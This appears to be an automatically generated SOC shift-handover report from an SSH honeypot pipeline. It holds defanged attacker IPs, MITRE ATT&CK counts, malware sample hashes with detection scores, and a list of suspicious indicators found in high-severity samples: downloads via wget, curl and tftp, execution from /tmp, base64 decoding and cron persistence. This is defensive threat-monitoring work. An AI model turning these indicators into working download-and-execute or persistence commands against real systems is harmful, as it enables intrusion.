| `195.178.110[.]232` | **4** | 2026-08-01 08:56 | 2026-08-01 09:40 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]192` | **4** | 2026-08-01 10:02 | 2026-08-01 10:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **3** | 2026-08-01 10:14 | 2026-08-01 12:13 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `194.165.16[.]122` | **3** | 2026-08-01 11:35 | 2026-08-01 11:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]162` | **3** | 2026-08-01 11:52 | 2026-08-01 11:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]164` | **3** | 2026-08-01 10:33 | 2026-08-01 10:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]37` | **3** | 2026-08-01 10:01 | 2026-08-01 10:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]176` | **3** | 2026-08-01 10:01 | 2026-08-01 10:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]124` | **3** | 2026-08-01 09:00 | 2026-08-01 09:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.238.181[.]92` | **3** | 2026-08-01 10:05 | 2026-08-01 10:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-08-01 10:46 | 2026-08-01 10:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]227` | **2** | 2026-08-01 11:59 | 2026-08-01 12:18 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.227.140[.]178` | **2** | 2026-08-01 09:52 | 2026-08-01 11:35 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.89.148[.]7` | 1 | 2026-08-01 12:15 | 2026-08-01 12:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `104.152.58[.]233` | 1 | 2026-08-01 09:03 | 2026-08-01 09:04 | 18s | 0 | `T1592` | 🟢 LOW |
| `117.204.1[.]45` | 1 | 2026-08-01 10:11 | 2026-08-01 10:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `118.145.154[.]96` | 1 | 2026-08-01 11:38 | 2026-08-01 11:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `121.202.198[.]98` | 1 | 2026-08-01 10:14 | 2026-08-01 10:14 | 6s | 0 | `T1592` | 🟢 LOW |
| `188.130.250[.]243` | 1 | 2026-08-01 10:03 | 2026-08-01 10:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `195.211.96[.]85` | 1 | 2026-08-01 10:29 | 2026-08-01 10:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.211.96[.]85` | 1 | 2026-08-01 12:50 | 2026-08-01 12:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `218.59.235[.]170` | 1 | 2026-08-01 11:24 | 2026-08-01 11:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `218.61.251[.]3` | 1 | 2026-08-01 09:40 | 2026-08-01 09:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `222.220.102[.]32` | 1 | 2026-08-01 09:18 | 2026-08-01 09:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]147` | 1 | 2026-08-01 10:10 | 2026-08-01 10:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.194.67[.]26` | 1 | 2026-08-01 12:11 | 2026-08-01 12:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.78.207[.]244` | 1 | 2026-08-01 09:28 | 2026-08-01 09:28 | 8s | 0 | `T1592` | 🟢 LOW |
| `45.79.8[.]221` | 1 | 2026-08-01 09:36 | 2026-08-01 09:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]122` | 1 | 2026-08-01 10:26 | 2026-08-01 10:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `67.220.180[.]114` | 1 | 2026-08-01 10:44 | 2026-08-01 10:44 | 5s | 0 | `T1592` | 🟢 LOW |
| `90.230.212[.]29` | 1 | 2026-08-01 11:31 | 2026-08-01 11:33 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **36/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 59/100 | 🟡 MEDIUM | **23/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `8.137.167[.]190` | CN | Aliyun Computing Co.LTD | **100** ⚠️ | 0 |
| `60.214.127[.]246` | CN | China Unicom Shandong province network | **100** ⚠️ | 50 |
| `185.2.228[.]48` | LT | Tele2 Lithuania | **100** ⚠️ | 50 |
| `118.26.153[.]102` | HK | China Unicom (Hong Kong) Operations Limited | **100** ⚠️ | 50 |
| `116.72.9[.]151` | IN | HATHWAY CABLE AND DATACOM LIMITED | **100** ⚠️ | 50 |
| `1.212.225[.]99` | KR | LG Uplus | **100** ⚠️ | 50 |
| `130.185.96[.]113` | IL | Pelephone Communications Ltd. | **100** ⚠️ | 50 |
| `50.187.155[.]130` | US | Comcast Cable Communications, LLC | **100** ⚠️ | 50 |
| `121.202.198[.]98` | HK | SmarTone Mobile Communications Ltd | **100** ⚠️ | 50 |
| `118.145.154[.]96` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 4 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 189 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 161 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 69 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 69 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 68 |

---

## 🔕 False Positive Summary (26 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 21 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 22 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 258 cases |
| Tool 34  | Credential Extractor        | ✅ 196 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 15 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 115 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 26 filtered (10.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 72 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 24 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 161 priority case(s) shown individually · 33 recon entry/entries in table (15 group(s) consolidating 53 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-01T13:37:01Z_
